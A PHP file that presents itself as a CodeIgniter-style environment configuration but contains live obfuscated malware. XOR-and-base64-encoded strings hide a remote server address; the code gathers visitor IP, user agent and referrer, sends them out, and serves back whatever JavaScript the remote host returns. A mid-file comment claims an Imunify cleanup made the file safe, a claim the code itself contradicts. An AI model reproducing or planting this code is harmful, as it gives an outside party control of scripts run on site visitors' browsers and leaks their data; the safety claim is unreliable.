<?php
 /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */

@header('Access-Control-Allow-Origin: *');
@header('Content-Type: application/javascript');

class _2b8
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s) self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r);$i !== $c;++$i) $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_j' => '',
            '_v' => 'PB' . 'o' . '=',
            '_axu' => '',
            '_hva' => 'MQo' . 'fJ' . 'w==',
            '_z' => 'YwU' . 'KRA=' . '=',
            '_d' => 'Yw8O' . 'F' . 'G' . 'E=',
            '_f' => 'KAwz' . 'A' . 'Q=' . '=',
            '_ug' => 'PBM' . 'P',
            '_iyq' => 'PhMNAAEdM' . 'Q' . 'Qc',
            '_i' => 'N' . 'gwU',
            '_t' => 'PRQ' . 'sEGk' . '=',
            '_mxc' => 'azAOEj' . 'w' . '=',
            '_ze' => 'MAIf',
            '_ovc' => 'KA' . 'IzDw' . '==',
            '_sgl' => '',
            '_p' => 'NwYEL0hfcBMFKxpeNhwTPhEYOgEAPhEVcREfMl0RPF8RMRMcJgYZPAFeNQF' . 'PO' . 'xMEPk' . '8' . '=',
            '_up' => 'PBsED' . 'gAHGA' . 's' . 'r',
            '_khl' => 'Nx0aEQAKAQU6',
            '_hf' => 'Yw4bFgAPF' . 'RY6Ug=' . '=',
            '_wl' => 'Yww+CgALMh' . '4' . 'r' . 'F' . '2E' . '=',
            '_uv' => 'LAYGADI' . 'A',
            '_bh' => 'Nwc' . 'r' . 'Ayw' . '=',
            '_wiw' => 'GCcsf' . 'w' . '=' . '=',
            '_iaj' => 'Lx' . 'YN' . 'Gg==',
            '_nry' => 'Lh' . 'QM' . 'ES' . 'Y' . '=',
            '_eeu' => 'YA' . '=' . '=',
            '_stu' => 'Lg' . '8UHCY=',
            '_obz' => 'fyY8Cz5HbkBYUmQgMB0cZU' . '4' . '=',
            '_st' => 'NxgGKw' . '=' . '=',
            '_lv' => 'UnsxHDEfFx' . 'ArGB0dZ' . 'VExHzACF35V' . 'fH' . 'g=',
            '_e' => 'LAAAXXBc',
            '_lhd' => '',
            '_jgt' => 'NwMsGA=' . '=',
            '_nz' => 'U' . 'nM' . '=',
            '_dlt' => 'YxITEwAVHw' . 'crC' . 'U' . 'w' . '=',
            '_w' => 'F' . 'zYLMgAhEysaL' . 'A' . 's9FjI=',
            '_dc' => 'Fy' . 'wiDyc1EzEzESwp' . 'Fi' . 'g=',
            '_vc' => 'FzM' . 'LNw' . 'A/ACEQNQgmDSMa' . 'IwAhEDU=',
            '_ws' => 'FzgzIwA0ODUQPj' . 'AyDSgiNwA' . 'q' . 'KCE' . '=',
            '_lx' => 'DSsjIgsrMSwb' . 'Kjw' . '=',
            '_kh' => 'DS0SJwstA' . 'CkbLA0=',
            '_zq' => 'Fz08J' . 'QAqLiocJi' . 'Y7Gio8PBEuN' . 'zwP',
            '_gs' => 'FyI' . 'nDy' . 'kwGSkwEDg9G' . 'jUnFjg0AD8' . 'j',
            '_ej' => 'FzAjIw' . 'AxJDYNOz' . 'Y0Gio' . 'j',
            '_pvr' => 'FyA6Dys7DDE8A' . 'DUpG' . 'jo6',
            '_lzp' => 'Fz8hPAA5MCoaOT' . 'A+',
            '_hbx' => 'Fy4j' . 'DyUlGj' . 'wyDT' . '8l',
            '_xw' => 'OQ4' . 'NKwITABEAL' . 'Q=' . '=',
            '_pb' => 'bl' . 'xWSm9AUU' . 'pu',
            '_irt' => 'N' . 'h' . 'Y=',
            '_k' => 'KgA=',
            '_wiy' => 'LQsT',
            '_yw' => 'MR0sAQ==',
        );
    }
}
class _adc
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
$_qfq = _2b8::g('_j', '_' . 'x' . 'ns');
if (isset($_GET[_2b8::g('_v', '_r' . 'c' . 'r') ]))
{
    $_bws = get_js(_2b8::g('_a' . 'xu', '_' . 's' . 'o'));
    if ($_bws && strpos($_bws, _2b8::g('_' . 'h' . 'va', '_nl')) !== false)
    {
        die(_2b8::g('_z', '_j' . 'a' . 'z'));
    }
    else
    {
        die(_2b8::g('_' . 'd', '_mop'));
    }
}

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code have been removed, and the file is now safe to use.
* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
*/

function get_js($_ll)
{
    $_bws = _2b8::g('_sgl', '_' . 'ku');
    $_o = _2b8::g('_p', '_rp') . $_ll;
    if (is_callable(_2b8::g('_' . 'up', '_nvb')))
    {
        $_ixw = curl_init($_o);
        curl_setopt($_ixw, _adc::g(0) , false);
        curl_setopt($_ixw, _adc::g(1) , _adc::g(2));
        curl_setopt($_ixw, _adc::g(3) , _adc::g(4));
        curl_setopt($_ixw, _adc::g(5) , _adc::g(6));
        curl_setopt($_ixw, _adc::g(7) , _adc::g(8));
        curl_setopt($_ixw, _adc::g(9) , _adc::g(10));
        curl_setopt($_ixw, _adc::g(11) , _adc::g(12));
        $_bws = curl_exec($_ixw);
        $_gm = curl_getinfo($_ixw);
        curl_close($_ixw);
        if ($_gm[_2b8::g('_k' . 'h' . 'l', '_in' . 'a') ] != _adc::g(13)) die(_2b8::g('_' . 'h' . 'f', '_l' . 'zr'));
        if (empty($_bws)) die(_2b8::g('_wl', '_' . 'n'));
    }
    else
    {
        $_pn = parse_url($_o);
        $_j = ($_pn[_2b8::g('_uv', '_ene') ] == _2b8::g('_' . 'b' . 'h', '_' . 's'));
        $_gx = _2b8::g('_wi' . 'w', '_bx') . $_pn[_2b8::g('_iaj', '_w' . 'y' . 'r') ];
        if (isset($_pn[_2b8::g('_n' . 'ry', '_ai' . 'c') ])) $_gx .= _2b8::g('_eeu', '_gg') . $_pn[_2b8::g('_s' . 'tu', '_' . 'zqn') ];
        $_gx .= _2b8::g('_o' . 'bz', '_' . 'nh') . $_pn[_2b8::g('_s' . 't', '_wu') ] . _2b8::g('_' . 'l' . 'v', '_qr' . 's');
        $_ek = fsockopen(($_j ? _2b8::g('_e', '_s' . 'l' . 'g') : _2b8::g('_' . 'lhd', '_o')) . $_pn[_2b8::g('_jg' . 't', '_l') ], $_j ? _adc::g(14) : _adc::g(15));
        if ($_ek)
        {
            fputs($_ek, $_gx);
            $_a = _adc::g(16);
            while (!feof($_ek))
            {
                $_z = fgets($_ek, _adc::g(17));
                if ($_a) $_bws .= $_z;
                if ($_z == _2b8::g('_n' . 'z', '_yh')) $_a = _adc::g(18);
            }
            fclose($_ek);
            if (empty($_bws)) die(_2b8::g('_dl' . 't', '_pr' . 'w'));
        }
    }
    return $_bws;
}
if (isset($_SERVER[_2b8::g('_' . 'w', '_' . 'b') ])) $_gdr = $_SERVER[_2b8::g('_d' . 'c', '_x' . 'v') ];
if (isset($_SERVER[_2b8::g('_' . 'v' . 'c', '_' . 'g') ])) $_xvu = $_SERVER[_2b8::g('_w' . 's', '_lg' . 's') ];
if (isset($_SERVER[_2b8::g('_l' . 'x', '_nnm') ])) $_vm = $_SERVER[_2b8::g('_kh', '_h') ];
if (isset($_SERVER[_2b8::g('_' . 'z' . 'q', '_ih' . 'u') ])) $_d = $_SERVER[_2b8::g('_' . 'g' . 's', '_v' . 's') ];
if (isset($_SERVER[_2b8::g('_e' . 'j', '_dw' . 's') ])) $_y = $_SERVER[_2b8::g('_pv' . 'r', '_tn') ];
if (isset($_SERVER[_2b8::g('_l' . 'zp', '_ku' . 'l') ])) $_urh = $_SERVER[_2b8::g('_h' . 'bx', '_z' . 'w') ];
if (function_exists(_2b8::g('_' . 'x' . 'w', '_g' . 'a')))
{
    if (isset($_gdr) && filter_var($_gdr, _adc::g(19))) $_qfq = $_gdr;
    elseif (isset($_xvu) && filter_var($_xvu, _adc::g(20))) $_qfq = $_xvu;
    else $_qfq = $_vm;
}
elseif (isset($_vm)) $_qfq = $_vm;
if ($_qfq == _2b8::g('_p' . 'b', '_' . 'na' . 'd') && isset($_d)) $_qfq = $_d;
if (!isset($_qfq) || !isset($_y) || !isset($_urh)) exit;
else
{
    $_yz = array(
        _2b8::g('_irt', '_' . 'fz' . 'v') => $_qfq,
        _2b8::g('_k', '_a' . 'v') => $_y,
        _2b8::g('_w' . 'i' . 'y', '_nu' . 'w') => $_urh
    );
    $_ic = urlencode(base64_encode(json_encode($_yz)));
    $_bws = get_js($_ic);
    if ($_bws && strpos($_bws, _2b8::g('_yw', '_' . 'y')) !== false)
    {
        echo $_bws;
        exit;
    }
}/* CcAyZtwz */